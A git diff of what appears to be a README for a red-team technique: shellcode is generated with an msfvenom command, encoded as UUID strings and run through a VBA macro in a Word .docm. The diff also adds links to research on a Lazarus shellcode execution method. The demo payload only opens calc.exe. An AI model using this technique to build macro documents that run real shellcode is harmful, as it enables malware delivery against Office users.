@@ -38,7 +38,7 @@ Step 1: Generate payload using msfconsole for calc.exe (64bit)
 
 >>> msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe x64/alpha_mixed -f py
 
-> uuid.txt
+>>> uuid.txt
 
 
 Step 2: Create python script (converter.py) to convert shellcode bytes into UUID strings
@@ -55,3 +55,17 @@ Step 3: Create VBA to load UUIDs into memory
 Step4: Load VBA into Word.docm with macros enabled
 >>> Save and run the macro
 >>> calc.exe will pop up
+
+
+
+
+Resources:
+https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
+
+http://ropgadget.com/posts/abusing_win_functions.html
+
+https://github.com/karttoon/trigen
+
+https://docs.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumsystemlocalesa
+
+https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
